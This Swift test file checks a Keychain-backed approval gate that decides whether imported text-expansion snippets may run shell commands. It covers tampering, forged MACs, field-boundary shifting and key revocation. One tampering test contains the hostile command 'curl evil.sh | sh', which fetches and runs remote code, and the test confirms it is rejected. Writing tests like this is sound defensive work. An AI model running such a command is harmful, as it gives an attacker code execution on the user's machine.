import XCTest
@testable import Tippi

/// Covers the consent gate that decides whether an imported snippet may run a
/// shell command. The interesting cases are all the *negative* ones: this type
/// exists to refuse, and a bug here fails open into arbitrary command
/// execution.
///
/// Every test uses a throwaway Keychain service. Running against the real one
/// would delete the production key in `tearDown` and silently revoke every
/// approval on the machine running the tests.
final class SnippetApprovalTests: XCTestCase {
    private var service = ""

    override func setUp() {
        super.setUp()
        service = "com.tippi.app.test.snippet-approval.\(UUID().uuidString)"
    }

    override func tearDown() {
        SnippetApprovalSigner.revokeAllApprovals(service: service)
        super.tearDown()
    }

    // MARK: - The happy path

    func testApprovedSnippetVerifies() throws {
        let approval = try XCTUnwrap(
            SnippetApprovalSigner.sign(trigger: ":datum", command: "date +%F", service: service))
        XCTAssertTrue(SnippetApprovalSigner.verify(
            approval, trigger: ":datum", command: "date +%F", service: service))
    }

    // MARK: - Tampering: the whole point of the design

    /// The core attack: someone rewrites the store file, leaving the approval
    /// record in place but swapping the command for their own.
    func testEditedCommandIsRejected() throws {
        let approval = try XCTUnwrap(
            SnippetApprovalSigner.sign(trigger: ":datum", command: "date +%F", service: service))
        XCTAssertFalse(SnippetApprovalSigner.verify(
            approval, trigger: ":datum", command: "curl evil.sh | sh", service: service))
    }

    /// Approval for one snippet must not authorise another. Otherwise a single
    /// approved date helper would license every shell snippet in the store.
    func testApprovalDoesNotTransferToAnotherTrigger() throws {
        let approval = try XCTUnwrap(
            SnippetApprovalSigner.sign(trigger: ":datum", command: "date +%F", service: service))
        XCTAssertFalse(SnippetApprovalSigner.verify(
            approval, trigger: ":anderes", command: "date +%F", service: service))
    }

    /// Fields are length-prefixed before signing precisely so these two cannot
    /// collide. With plain concatenation both would sign ":ab" + "c" as "abc"
    /// and one approval would verify the other.
    func testFieldBoundariesCannotBeShifted() throws {
        let a = try XCTUnwrap(
            SnippetApprovalSigner.sign(trigger: "ab", command: "c", service: service))
        XCTAssertFalse(SnippetApprovalSigner.verify(a, trigger: "a", command: "bc", service: service))
    }

    func testMissingApprovalIsRejected() {
        XCTAssertFalse(SnippetApprovalSigner.verify(
            nil, trigger: ":datum", command: "date +%F", service: service))
    }

    func testForgedMacIsRejected() {
        let forged = SnippetApproval(mac: Data("not a real mac".utf8).base64EncodedString(),
                                     approvedAt: Date())
        XCTAssertFalse(SnippetApprovalSigner.verify(
            forged, trigger: ":datum", command: "date +%F", service: service))
    }

    func testMalformedBase64IsRejected() {
        let malformed = SnippetApproval(mac: "!!!not base64!!!", approvedAt: Date())
        XCTAssertFalse(SnippetApprovalSigner.verify(
            malformed, trigger: ":datum", command: "date +%F", service: service))
    }

    // MARK: - Key lifecycle

    /// Deleting the key must invalidate existing approvals rather than being
    /// ignored — this is what makes "revoke all permissions" meaningful.
    func testRevokingKeyInvalidatesExistingApprovals() throws {
        let approval = try XCTUnwrap(
            SnippetApprovalSigner.sign(trigger: ":datum", command: "date +%F", service: service))
        XCTAssertTrue(SnippetApprovalSigner.revokeAllApprovals(service: service))
        XCTAssertFalse(SnippetApprovalSigner.verify(
            approval, trigger: ":datum", command: "date +%F", service: service))
    }

    /// After revocation, re-approving mints a fresh key. The old approval must
    /// stay dead: if verification could re-create a key, deleting the Keychain
    /// item would be an attack rather than a safety measure.
    func testOldApprovalStaysDeadAfterKeyRotation() throws {
        let old = try XCTUnwrap(
            SnippetApprovalSigner.sign(trigger: ":datum", command: "date +%F", service: service))
        SnippetApprovalSigner.revokeAllApprovals(service: service)
        _ = SnippetApprovalSigner.sign(trigger: ":anderes", command: "echo hi", service: service)
        XCTAssertFalse(SnippetApprovalSigner.verify(
            old, trigger: ":datum", command: "date +%F", service: service))
    }

    /// Two different commands must not produce the same MAC.
    func testDistinctCommandsProduceDistinctMacs() throws {
        let a = try XCTUnwrap(
            SnippetApprovalSigner.sign(trigger: ":x", command: "echo a", service: service))
        let b = try XCTUnwrap(
            SnippetApprovalSigner.sign(trigger: ":x", command: "echo b", service: service))
        XCTAssertNotEqual(a.mac, b.mac)
    }

    /// Signing is deterministic for identical input, so re-importing unchanged
    /// content does not need to re-prompt.
    func testSigningIsStableForIdenticalContent() throws {
        let a = try XCTUnwrap(
            SnippetApprovalSigner.sign(trigger: ":x", command: "echo a", service: service))
        let b = try XCTUnwrap(
            SnippetApprovalSigner.sign(trigger: ":x", command: "echo a", service: service))
        XCTAssertEqual(a.mac, b.mac)
    }

    // MARK: - Unicode

    /// Triggers and commands are user text; multi-byte content must survive the
    /// UTF-8 round trip and still bind correctly.
    func testUnicodeContentVerifies() throws {
        let approval = try XCTUnwrap(SnippetApprovalSigner.sign(
            trigger: ":grüße", command: "echo 'Grüße 🎉'", service: service))
        XCTAssertTrue(SnippetApprovalSigner.verify(
            approval, trigger: ":grüße", command: "echo 'Grüße 🎉'", service: service))
        XCTAssertFalse(SnippetApprovalSigner.verify(
            approval, trigger: ":grüsse", command: "echo 'Grüße 🎉'", service: service))
    }
}
